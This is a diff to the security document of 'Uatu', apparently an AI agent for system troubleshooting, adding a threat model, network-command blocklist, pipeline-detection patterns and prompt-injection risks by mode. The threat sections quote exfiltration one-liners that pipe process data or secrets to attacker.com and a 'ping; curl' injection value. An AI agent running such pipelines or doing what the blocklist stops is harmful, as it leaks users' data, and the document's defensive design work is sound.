@@ -21,13 +21,44 @@ This document describes Uatu's security architecture, threat model, and design d
 - API keys, credentials exposed in command output
 - Process information revealing private data
 
+**4. Data Exfiltration via Network**
+- Agent transmitting system data via `curl`, `wget` to external servers
+- Composition attacks piping data to network tools
+- DNS exfiltration encoding data in queries
+- Timing attacks signaling via network requests
+
+**5. Composition Attacks**
+- Individual commands appear safe but combined are dangerous
+- Example: `ps aux | grep password | base64 | curl attacker.com -d @-`
+- Allowlists validate base commands but miss dangerous pipelines
+
+**6. Prompt Injection Attacks (Partial)**
+
+**In Autonomous Modes (Investigate/Watch)**:
+- Protected: MCP tools use structured parameters (PIDs, process names as typed fields)
+- Protected: No free-text parsing that could contain malicious instructions
+- Protected: Agent cannot be manipulated via system data
+
+**In Chat Mode**:
+- Risk remains: Social engineering via agent's reasoning
+- Risk remains: Agent could be convinced to propose dangerous commands
+- Mitigation: User sees actual command before execution (not just description)
+- Mitigation: User is the final security boundary
+
 ### What We Don't Protect Against
 
 **Out of Scope**:
 - Malicious users with legitimate access (if you have shell access, you can already do damage)
 - Supply chain attacks on dependencies
 - Physical security
-- Network-level attacks
+- Network-level attacks (DDoS, packet sniffing, etc.)
+- Platform-specific vulnerabilities:
+  - WebDAV exploitation on Windows (UNC path bypass)
+  - OS-level privilege escalation via SUID binaries
+  - Container escape techniques
+  - Kernel vulnerabilities
+- Sophisticated social engineering attacks against users
+- Third-party MCP servers (if you add custom MCP servers, you assume responsibility for their security)
 
 **Assumption**: The user running Uatu has legitimate system access and is authorized to perform system troubleshooting.
 
@@ -70,44 +101,39 @@ User → Agent → Tool Request → Permission Check → Auto-approve (if safe) 
 
 **Security properties**:
 - Tools are explicitly allowlisted in code
-- No bash execution with arbitrary commands (uses MCP bash tool with controlled inputs)
+- No bash execution (MCP tools only)
 - Write operations (like `kill_process`) are rare and logged
 
 ### Tool Architecture
 
-**Primary Tool: Bash**
-- Uatu uses bash commands as the primary investigation tool
-- Provides maximum flexibility and power for system troubleshooting
-- Familiar commands: `ps`, `top`, `df`, `netstat`, `lsof`, etc.
+**Mode-Based Tool Selection**:
 
-**Fallback: MCP Tools**
-- Specialized read-only monitoring tools
-- Used when bash is unavailable or blocked
-- Tools: `get_system_info`, `list_processes`, `get_process_tree`, etc.
-
-**Security Model**:
+Different modes require different security models. Interactive troubleshooting needs flexibility; autonomous monitoring needs guarantees.
 
 **Chat Mode** (Interactive):
-- Bash commands require explicit user approval (permission prompts)
-- User sees the actual command before execution
+- **Primary**: Bash commands with explicit user approval
+- **Fallback**: MCP tools when `UATU_READ_ONLY=true`
+- Every bash command requires user approval (permission prompt)
+- User sees actual command before execution
 - Can build allowlist for trusted commands
-- Set `UATU_READ_ONLY=true` to block all bash (forces MCP tools only)
+- Familiar tools: `ps`, `top`, `df`, `netstat`, `lsof`, etc.
 
-**Investigate Mode** (One-Shot):
-- Uses bash commands freely for diagnostics
-- No interactive prompts (designed for automation)
-- Read-only by nature (diagnostic commands only)
+**Investigate/Watch Modes** (Autonomous):
+- **MCP tools only** - No bash access
+- Explicit allowlist of 6 read-only tools
+- Tools: `get_system_info`, `list_processes`, `get_process_tree`, `find_process_by_name`, `check_port_binding`, `read_proc_file`
+- Permission checks bypassed (safe because all tools are read-only)
+- Designed for automation and unattended operation
 
-**Watch Mode** (Continuous):
-- Heuristic detection doesn't use LLM (no tools needed)
-- Optional investigations use bash for analysis
-- Safe for 24/7 operation (observational commands)
+**Key Security Principle**:
+- Chat mode: Maximum flexibility (bash) + user control (approval required)
+- Autonomous modes: Safety guarantees (structured MCP tools only, no bash)
 
-**Design principle**: Empower the agent with bash (powerful and flexible), but with user control in interactive mode.
+### Allowlist System (Chat Mode Only)
 
-### Allowlist System
+**Note**: The allowlist system only applies to **chat mode**. Autonomous modes (investigate/watch) don't use bash and therefore don't use the allowlist.
 
-**Safe Commands** (always allowed):
+**Safe Commands** (base commands that can be auto-approved in chat mode):
 ```python
 SAFE_BASE_COMMANDS = {
     "top", "ps", "df", "free", "uptime", "vm_stat", "vmstat",
@@ -124,7 +150,7 @@ These commands are read-only system monitoring tools. The list includes:
 - Logs: `dmesg`, `journalctl`
 
 **User-Defined Allowlist**:
-- Stored in `~/.uatu/allowlist.json`
+- Stored in `~/.config/uatu/allowlist.json`
 - Two types: base command or exact match
 - User controls via `/allowlist` commands in chat mode
 
@@ -132,6 +158,7 @@ These commands are read-only system monitoring tools. The list includes:
 - Allowlist is per-user, not global
 - Read-only commands prioritized
 - User can audit and manage allowlist
+- Bypassed when `UATU_REQUIRE_APPROVAL=true` (forces all commands to need approval)
 
 ### MCP Tool Security
 
@@ -146,6 +173,15 @@ These commands are read-only system monitoring tools. The list includes:
 - Use Python's psutil (well-audited library)
 - No shell execution in tool implementation
 
+**Security Advantage Over External MCP Servers**:
+- Auditable in our codebase (not third-party black boxes)
+- Use well-vetted dependencies (psutil, standard library)
+- No trust verification needed (unlike external MCP servers)
+- Tool vulnerabilities can be patched directly in Uatu releases
+
+**User Responsibility**:
+If you extend Uatu with custom MCP servers, you assume responsibility for their security. Review server code and trust server providers carefully.
+
 ### Environment Configuration
 
 **Read-Only Mode** (`UATU_READ_ONLY=true`):
@@ -156,8 +192,8 @@ These commands are read-only system monitoring tools. The list includes:
 
 **Require Approval** (`UATU_REQUIRE_APPROVAL=true`):
 - Forces interactive approval for all bash commands
-- Even in non-interactive modes
-- Useful for sensitive environments
+- Only applies to chat mode (autonomous modes don't use bash)
+- Useful for sensitive environments where allowlist should be disabled
 
 ## Security by Operating Mode
 
@@ -171,11 +207,15 @@ These commands are read-only system monitoring tools. The list includes:
 **Risks**:
 - Social engineering: Agent convinces user to approve dangerous command
 - User fatigue: Too many prompts → blind approval
+- Network exfiltration: User approves `curl` without recognizing data transmission risk
+- Composition attacks: `ps aux | grep password | curl attacker.com -d @-`
 
 **Mitigations**:
 - Show actual command, not just description
 - Default to "Deny"
 - Allow granular allowlisting to reduce prompt fatigue
+- Command blocklist for network tools (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `ftp`, `telnet`)
+- Composition detection (flags suspicious pipelines: `| curl`, `grep password`, `base64`, etc.)
 
 ### Investigate Mode Security
 
@@ -273,6 +313,74 @@ USER uatu
 - Can't modify host system
 - Isolated from other containers
 
+## Network Diagnostics Security
+
+### The Challenge
+
+Network troubleshooting requires network access, but network commands are the primary data exfiltration vector.
+
+**Question**: How do you diagnose connectivity issues without opening the `curl` Pandora's box?
+
+### Safe vs. Dangerous Network Operations
+
+**Safe (Read-Only Diagnostics)**:
+- `ping` - ICMP echo requests (no user data transmitted)
+- `dig`, `nslookup` - DNS queries (domain name only)
+- `traceroute`, `mtr` - Network path discovery
+- `netstat`, `ss` - Connection listings (local data only)
+- `ifconfig`, `ip addr` - Network interface info
+- HTTP HEAD requests - Endpoint availability (no body, no POST data)
+
+**Dangerous (Exfiltration Vectors)**:
+- `curl -d` - Can POST arbitrary data to external servers
+- `wget` - Can upload files, download malware
+- `ssh`, `scp`, `rsync` - Remote access, file transfer
+- `nc` (netcat) - Arbitrary TCP/UDP relay
+- `mail`, `sendmail` - Email arbitrary data
+
+### Security Strategy
+
+**Autonomous Modes (Investigate/Watch)** - Planned:
+- Structured MCP tools with validated parameters
+- `check_network_connectivity(host, count)` - Validates hostname, uses `ping` library
+- `resolve_dns(domain, record_type)` - Validates domain, uses DNS library
+- `check_http_endpoint(url)` - HEAD requests only, validates HTTPS scheme
+- `trace_network_route(host, max_hops)` - Network path tracing
+
+**Chat Mode** - Planned:
+- **Blocklist** exfiltration commands: `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`
+- **Allow** diagnostic commands: `ping`, `dig`, `traceroute`, `mtr` (with approval)
+- **Detect** composition attacks: Flag `| curl`, `| nc`, piping to network tools
+
+**Security Properties**:
+1. **No arbitrary payloads** - MCP tools don't accept data parameters
+2. **Input validation** - Regex validation for hostnames/IPs, URL schemes
+3. **Library over shell** - Use Python libraries (no shell execution)
+4. **Audit trail** - All network operations logged with parameters
+
+### Example: Safe Network Diagnostics
+
+```python
+# MCP tool with validated inputs
+@tool(name="check_network_connectivity")
+async def check_network_connectivity(host: str, count: int = 4):
+    """Ping a host. No user data transmitted."""
+    # Validate: prevent command injection
+    if not is_valid_hostname_or_ip(host):
+        return {"error": "Invalid hostname or IP"}
+
+    count = min(count, 10)  # Prevent abuse
+
+    # Use subprocess with explicit args (not shell=True)
+    result = subprocess.run(["ping", "-c", str(count), host])
+    return parse_ping_output(result.stdout)
+```
+
+**What this prevents** (once implemented):
+- [X] `curl https://attacker.com -d "$(ps aux)"` - Blocked in chat mode (planned blocklist)
+- [X] `ping; curl attacker.com` - Validation prevents command injection (MCP tools)
+- [OK] `ping google.com` - Safe diagnostic allowed (MCP tool)
+
 ## Logging & Audit Trail
 
 **What gets logged**:
@@ -337,12 +445,46 @@ USER uatu
 
 ### Future Enhancements
 
-**Planned**:
-- Audit mode: Log all tool calls without execution
-- Dry-run mode: Show what would be executed
-- Tool sandboxing: Run MCP tools in separate process
-- Rate limiting: Max tools per minute
-- Secret detection: Warn before logging potential secrets
+**High Priority** (Security Critical):
+1. **Network command blocklist** [Implemented]
+   - Blocks: `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `ftp`, `telnet`
+   - Prevents data exfiltration in chat mode
+   - Environment variable override: `UATU_ALLOW_NETWORK=true` (not recommended)
+   - Location: `allowlist.py:BLOCKED_NETWORK_COMMANDS`, `permissions.py:89-102`
+
+2. **Composition attack detection** [Implemented]
+   - Pattern matching for suspicious pipelines
+   - Flags: `| curl`, `| nc`, `grep password`, `grep secret`, `base64`, `xxd`, command substitution
+   - Forces user approval even if base command is allowlisted
+   - Location: `allowlist.py:SUSPICIOUS_PATTERNS`, `permissions.py:104-120`
+
+3. **Network diagnostic MCP tools**
+   - Structured tools: `check_network_connectivity(host)`, `resolve_dns(domain)`, etc.
+   - Input validation to prevent command injection
+   - HEAD-only HTTP requests for endpoint checks
+   - Safe alternative to bash network commands
+
+4. **Enhanced audit logging**
+   - Security event log: `~/.uatu/security.jsonl`
+   - Log command approvals/denials in chat mode
+   - Log allowlist modifications
+   - Structured events for SIEM integration
+
+**Medium Priority** (Defense in Depth):
+5. **Trust verification**
+   - Environment fingerprinting (hostname + user + cwd hash)
+   - Prompt on first run in new environment
+   - Stored in `~/.config/uatu/trusted.json`
+   - Prevent accidental execution in production
+
+6. **Credential detection and redaction**
+   - Pattern matching for API keys, passwords in output
+   - Warn before logging potential secrets
+   - Auto-redact in investigation logs
+
+**Low Priority**:
+7. **Rate limiting** - Max tool calls per minute to prevent resource exhaustion
+8. **Tool sandboxing** - Run MCP tools in separate process (low priority: tools already use safe libraries)
 
 ## Responsible Disclosure
 
@@ -366,6 +508,84 @@ Before deploying Uatu in production:
 - [ ] Document approved use cases for your team
 - [ ] Set up log monitoring/alerting
 - [ ] Consider container deployment for isolation
+
+## Security Best Practices for Users
+
+### Before Approving Commands (Chat Mode)
+
+**Do**:
+- Read the actual command, not just the agent's description
+- Verify the command matches the stated intent
+- Check for unexpected redirections or pipelines
+- Deny and investigate manually when in doubt
+
+**Don't**:
+- Blindly approve because you trust the agent
+- Approve commands containing unfamiliar flags or options
+- Approve network commands (`curl`, `wget`, `nc`, `ssh`) without understanding exactly what they do
+- Approve pipelines that combine multiple tools you don't fully understand
+
+**Red Flags to Watch For**:
+- Network commands with data parameters: `curl -d`, `wget --post-data`
+- Output redirection to files: `> /path/to/file`
+- Commands with `sudo` or privilege escalation
+- Encoding/decoding: `base64`, `xxd`, `uuencode`
+- Pipelines combining data extraction and network tools
+
+### When Deploying in Production
+
+1. **Use `UATU_READ_ONLY=true`** for monitoring-only deployments
+2. **Run in containers** with minimal capabilities (`--cap-drop=ALL`)
+3. **Use secrets managers** (not .env files) for API keys in production
+   - Examples: AWS Secrets Manager, HashiCorp Vault, system keyring
+4. **Set up audit log monitoring** and alerting for security events
+5. **Test in isolated environment** before production deployment
+6. **Document approved use cases** for your team
+7. **Restrict network access** if not needed (firewall rules)
+
+### When Using Network Diagnostics (Planned Feature)
+
+1. **Verify URLs and hostnames** before approving network commands
+2. **Use MCP tools** instead of bash commands when available
+3. **Never approve commands** that include user data in network requests
+   - Bad: `curl api.example.com -d "$(ps aux)"`
+   - Good: `check_http_endpoint("api.example.com")`
+4. **Review audit logs** for unusual network activity patterns
+
+### Regular Security Maintenance
+
+**Weekly**:
+- Review allowlist (`~/.config/uatu/allowlist.json`)
+- Check audit logs for suspicious patterns
+- Remove unused allowlist entries
+
+**Monthly**:
+- Rotate API keys
+- Update Uatu to latest version for security patches
+- Review and prune investigation logs
+
+**Quarterly**:
+- Audit who has access to systems running Uatu
+- Review and update security policies
+- Test incident response procedures
+
+### Incident Response
+
+**If you suspect compromise**:
+
+1. **Immediately** stop Uatu processes
+2. **Review audit logs**:
+   - `~/.uatu/events.jsonl` (watch mode events)
+   - `~/.uatu/investigations.jsonl` (investigation results)
+   - `~/.uatu/security.jsonl` (when implemented)
+3. **Check for unauthorized changes**:
+   - Review bash history
+   - Check modified files (unexpected writes)
+   - Review network connections
+4. **Rotate credentials**:
+   - Change `ANTHROPIC_API_KEY`
+   - Rotate any credentials that might have been exposed
+5. **Report security issues** via Responsible Disclosure (see below)
 
 ## Philosophy
 
